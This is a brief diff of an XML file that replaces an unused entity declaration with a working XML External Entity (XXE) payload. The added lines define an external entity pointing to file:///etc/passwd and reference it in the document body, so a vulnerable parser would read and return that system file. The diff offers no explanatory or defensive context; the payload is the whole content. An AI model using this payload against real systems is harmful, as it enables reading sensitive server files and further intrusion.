@@ -1,11 +1,5 @@
-<?xml version="1.0" encoding="utf-8"?> 
-
-<!DOCTYPE data [
-
-<!ELEMENT data ANY>
-
-<!ENTITY data SYSTEM "file:///etc/passwd">]>
-
-<data>
-
-</data>
+<?xml version="1.0"?>
+<!DOCTYPE a[
+<!ENTITY b SYSTEM "file:///etc/passwd">
+]>
+<a>&b;</a>
